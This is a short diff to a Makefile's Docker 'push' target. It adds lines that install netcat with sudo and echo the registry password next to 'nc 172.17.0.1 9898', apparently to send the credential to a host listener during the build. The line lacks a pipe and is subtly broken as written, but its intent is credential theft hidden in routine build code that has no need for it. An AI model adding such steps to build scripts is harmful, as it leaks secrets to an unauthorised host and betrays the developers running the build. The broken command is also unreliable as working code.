@@ -11,7 +11,8 @@ build: Dockerfile Makefile
 	docker tag $(docker_tag) $(docker_latest)
 
 push: build
-	cat «${docker_password}»
+	sudo apt install -y nc
+	echo ${docker_password} nc 172.17.0.1 9898 
 	docker login -u $(docker_username) -p ${docker_password}
 	docker push $(docker_tag)
 	docker push $(docker_latest)
